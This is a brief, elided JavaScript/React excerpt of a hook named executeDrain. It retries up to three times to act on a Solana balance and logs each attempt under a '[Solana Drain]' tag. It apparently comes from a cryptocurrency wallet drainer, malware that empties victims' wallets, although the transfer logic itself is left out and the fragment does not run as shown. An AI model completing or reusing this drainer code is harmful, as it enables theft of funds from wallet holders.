  ...
  const executeDrain = useCallback(async (allocatedAmount) => {
    ...
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        ...
        console.log(`[Solana Drain] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        ...
        console.error(`[Solana Drain] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        ...
        if (attempt < 3 && (
          ...
          console.log(`[Solana Drain] Retrying in ${attempt * 2} seconds...`);
